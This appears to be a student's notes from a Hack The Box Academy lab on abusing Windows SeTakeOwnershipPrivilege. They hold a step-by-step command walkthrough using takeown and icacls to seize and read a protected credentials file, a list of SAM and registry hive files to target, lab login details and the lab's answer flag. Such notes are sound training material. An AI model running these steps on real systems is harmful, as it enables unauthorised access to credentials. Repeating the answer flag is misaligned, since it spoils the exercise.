@@ -1,1 +1,127 @@
 SeTakeOwnershipPrivilege grants a user the ability to take ownership of any "securable object," meaning Active Directory objects, NTFS files/folders, printers, registry keys, services, and processes. This privilege assigns WRITE_OWNER rights over an object, meaning the user can change the owner within the object's security descriptor. Administrators are assigned this privilege by default. While it is rare to encounter a standard user account with this privilege, we may encounter a service account that, for example, is tasked with running backup jobs and VSS snapshots assigned this privilege. It may also be assigned a few others such as SeBackupPrivilege, SeRestorePrivilege, and SeSecurityPrivilege to control this account's privileges at a more granular level and not granting the account full local admin rights. These privileges on their own could likely be used to escalate privileges. Still, there may be times when we need to take ownership of specific files because other methods are blocked, or otherwise, do not work as expected. Abusing this privilege is a bit of an edge case. Still, it is worth understanding in-depth, especially since we may also find ourselves in a scenario in an Active Directory environment where we can assign this right to a specific user that we can control and leverage it to read a sensitive file on a file share.
+
+
+Leveraging the Privilege
+Reviewing Current User Privileges
+Let's review our current user's privileges.
+
+PS SYNTAX: PS C:\htb> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                                              State
+============================= ======================================================= ========
+SeTakeOwnershipPrivilege      Take ownership of files or other objects                Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                                Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set                          Disabled
+
+Enabling SeTakeOwnershipPrivilege: 
+
+PS SYNTAX:PS C:\htb> Import-Module .\Enable-Privilege.ps1
+PS SYNTAX: PS C:\htb> .\EnableAllTokenPrivs.ps1
+PS SYNTAX: PS C:\htb> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+Privilege Name                Description                              State
+============================= ======================================== =======
+SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set           Enabled
+
+
+Let's check out our target file to gather a bit more information about it.
+
+PS SYNTAX: PS C:\htb> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
+ 
+FullName                                 LastWriteTime         Attributes Owner
+--------                                 -------------         ---------- -----
+C:\Department Shares\Private\IT\cred.txt 6/18/2021 12:23:28 PM    Archive
+
+Changing the Ownership
+- We can see that the owner is not shown, meaning that we likely do not have enough permissions over the object to view those details. We can back up a bit and check out the owner of the IT directory.
+
+PS SYNTAX: PS C:\htb> cmd /c dir /q 'C:\Department Shares\Private\IT'
+
+ Volume in drive C has no label.
+ Volume Serial Number is 0C92-675B
+ 
+ Directory of C:\Department Shares\Private\IT
+ 
+06/18/2021  12:22 PM    <DIR>          WINLPE-SRV01\sccm_svc  .
+06/18/2021  12:22 PM    <DIR>          WINLPE-SRV01\sccm_svc  ..
+06/18/2021  12:23 PM                36 ...                    cred.txt
+               1 File(s)             36 bytes
+               2 Dir(s)  17,079,754,752 bytes free
+
+
+Taking Ownership of File: 
+
+PS SYNTAX: PS C:\htb> takeown /f 'C:\Department Shares\Private\IT\cred.txt'
+ 
+SUCCESS: The file (or folder): "C:\Department Shares\Private\IT\cred.txt" now owned by user "WINLPE-SRV01\htb-student".
+
+Confirming change: 
+
+PS SYNTAX: PS C:\htb> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
+ 
+Name     Directory                       Owner
+----     ---------                       -----
+cred.txt C:\Department Shares\Private\IT WINLPE-SRV01\htb-student
+
+Modifying file ACL - We may still not be able to read the file and need to modify the file ACL using icacls to be able to read it.
+
+PS SYNTAX: PS C:\htb> cat 'C:\Department Shares\Private\IT\cred.txt'
+
+cat : Access to the path 'C:\Department Shares\Private\IT\cred.txt' is denied.
+At line:1 char:1
++ cat 'C:\Department Shares\Private\IT\cred.txt'
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : PermissionDenied: (C:\Department Shares\Private\IT\cred.txt:String) [Get-Content], Unaut
+   horizedAccessException
+    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
+
+Now Granting Full privs over file: 
+
+PS SYNTAX: PS C:\htb> icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
+
+processed file: C:\Department Shares\Private\IT\cred.txt
+Successfully processed 1 files; Failed processing 0 files
+
+and finally reading file 
+
+PS SYNTAX: PS C:\htb> cat 'C:\Department Shares\Private\IT\cred.txt'
+
+NIX01 admin
+ 
+root:n1X_p0wer_us3er!
+
+!*!*!*!*! Files of Interest
+Some local files of interest may include:
+
+  SeTakeOwnershipPrivilege
+c:\inetpub\wwwwroot\web.config
+%WINDIR%\repair\sam
+%WINDIR%\repair\system
+%WINDIR%\repair\software, %WINDIR%\repair\security
+%WINDIR%\system32\config\SecEvent.Evt
+%WINDIR%\system32\config\default.sav
+%WINDIR%\system32\config\security.sav
+%WINDIR%\system32\config\software.sav
+%WINDIR%\system32\config\system.sav 
+*!*!*!*!*
+
+CHALLENGE: RDP to 10.129.97.23 (ACADEMY-WINLPE-SRV01) with user "htb-student" and password "HTB_@cademy_stdnt!"
+
+
+Question 1 - Leverage SeTakeOwnershipPrivilege rights over the file located at "C:\TakeOwn\flag.txt" and submit the contents.  - 1m_th3_f1l3_0wn3r_n0W! 
+1) xfreerdp in there 
+2) powershell as admin 
+3) cd C:\tools
+4) Import-Module .\Enable-Privilege.ps1
+5) .\EnableAllTokenPrivs.ps1
+6) confirm all enabled with whoami /priv 
+7) takeown /f 'C:\TakeOwn\flag.txt'
+8) icacls 'C:\TakeOwn\flag.txt' /grant htb-student:F
+9) cat c:\TakeOwn\flag.txt - 1m_th3_f1l3_0wn3r_n0W!
